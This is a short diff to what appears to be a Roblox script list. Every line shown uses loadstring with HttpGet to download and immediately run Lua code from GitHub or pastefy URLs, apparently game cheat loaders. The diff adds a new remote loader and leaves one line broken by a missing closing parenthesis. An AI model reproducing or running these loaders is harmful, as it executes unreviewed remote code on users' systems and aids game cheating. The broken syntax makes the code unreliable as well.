@@ -47,4 +47,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/LucasggkX/Games/refs/
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdellacortw-svg/Website/refs/heads/main/config1"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rexzysab/stealabrainrot/refs/heads/main/1-999main.lua"))()
 loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rexzysab/stealabrainrot/refs/heads/main/1-999main.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rexzysab/stealabrainrot/refs/heads/main/1-999main.lua"))(
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aphiSab/ajjan/refs/heads/main/loader"))()
